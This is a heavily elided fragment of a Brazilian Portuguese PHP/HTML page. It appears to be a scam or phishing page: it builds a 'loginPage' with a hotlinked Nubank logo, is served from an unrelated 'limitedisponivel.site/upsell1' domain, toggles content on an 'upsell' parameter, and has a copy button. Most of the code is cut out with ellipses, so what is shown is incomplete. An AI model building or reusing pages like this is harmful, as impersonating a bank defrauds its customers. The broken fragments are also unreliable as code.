...
$logo= "https://will.limitedisponivel.site/upsell1/logo.png";
?>
<!DOCTYPE html>
<html lang="pt-BR">
...
<style>
    :root {
        --primary-color: #1451b4;
        --primary-hover: #1451b4;
    ...
    <div id="loginPage">
        <div class="top-bar">
            <div class="top-bar-content">
                <img src="https://ilegra.com/wp-content/uploads/2021/01/nubank-logo-branco.png" alt="Logo" class="logo">
...
if (!isset($_GET['upsell'])) {
    echo 'https://cdn-icons-png.flaticon.com/512/6364/6364343.png';
}else{
    echo 'https://cdn-icons-png.flaticon.com/512/6364/6364343.png';
}
?>');
...
<?php
if (!isset($_GET['upsell'])) {
    echo '<img src="https://i.imgur.com/SyFeVNb.png" alt="" width="100%">';
}
?>
...
$(document).ready(function() {
    ...
    $('#copyButton').click(function() {
        ...
        setTimeout(() => {
            ...
            $('#copyButton').css('background-color', '#090c3aff');
